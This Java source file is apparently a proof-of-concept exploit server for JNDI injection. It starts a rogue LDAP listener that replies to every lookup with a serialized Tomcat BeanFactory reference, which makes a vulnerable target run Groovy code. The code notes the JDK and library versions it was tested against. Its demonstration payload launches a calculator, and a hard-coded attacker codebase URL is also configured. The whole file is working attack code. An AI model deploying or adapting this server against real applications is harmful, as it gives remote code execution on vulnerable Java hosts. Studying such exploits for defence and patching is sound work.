package nth347.servers.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.URL;

/**
 * LDAP server for exploiting JNDI injection using local factory class
 * The exploitation technique requires the target application to have tomcat 8 and groovy 2 dependencies
 * Tested with target application running on JDK 8u212, having tomcat 8.5.0 and groovy 2.4.5 dependencies
 */
public class New2EvilLDAPServer {
    /**
     * Payload configuration
     */
    private static String CODEBASE_URL = "http://192.168.93.128:8000/";
    private static String JAVA_CLASS_NAME = "Payload";
    private static String JAVA_FACTORY = "PayloadFactory";

    /**
     * LDAP server configuration
     */
    private static String LDAP_ADDRESS = "0.0.0.0";
    private static int LDAP_PORT = 6360;
    private static String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName(LDAP_ADDRESS),
                    LDAP_PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(CODEBASE_URL)));
            InMemoryDirectoryServer directoryServer = new InMemoryDirectoryServer(config);
            System.out.println("LDAP server has started at " + LDAP_ADDRESS + ":" + LDAP_PORT);
            directoryServer.startListening();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException, IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NotFoundException, CannotCompileException, NoSuchFieldException {
            URL url = new URL(this.codebase.toString());
            System.out.println("Send Java schema containing javaSerializedData that matches to name " + base);

            entry.addAttribute("javaClassName", JAVA_CLASS_NAME);
            entry.addAttribute("javaSerializedData", getSerializedBytes()); // javaSerializedData

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    public static byte[] getSerializedBytes() throws ClassNotFoundException, InstantiationException, IllegalAccessException, IOException, NotFoundException, CannotCompileException, NoSuchFieldException {
        ResourceRef resourceRef = new ResourceRef("groovy.lang.GroovyShell", (String) null, "", "", true, "org.apache.naming.factory.BeanFactory", (String) null);
        resourceRef.add(new StringRefAddr("forceString", "nth347=evaluate"));
        resourceRef.add(new StringRefAddr("nth347", "\"gnome-calculator\".execute()"));

        /* Serialize object, return bytes */
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(resourceRef);
        oos.flush();
        byte[] bytes = bos.toByteArray();
        bos.close();

        return bytes;
    }
}